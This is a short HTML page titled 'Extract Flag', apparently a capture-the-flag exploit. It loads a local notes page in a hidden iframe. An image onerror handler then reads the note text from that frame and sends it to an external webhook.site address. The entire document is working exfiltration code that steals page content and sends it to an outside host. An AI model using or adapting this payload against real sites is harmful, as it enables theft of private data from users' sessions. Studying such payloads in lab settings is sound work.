<html>
  <head>
    <title>Extract Flag</title>
  </head>
  <body>
    <!-- Load note page in iframe -->
    <iframe id="noteFrame" src="http://127.0.0.1:7189/notes/1" style="display:none;"></iframe>
    <!-- Extract flag after iframe loads -->
    <img src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=" 
         onerror="this.src='https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag='+document.getElementById('noteFrame').contentDocument.querySelector('.note-content').innerText" />
  </body>
</html>
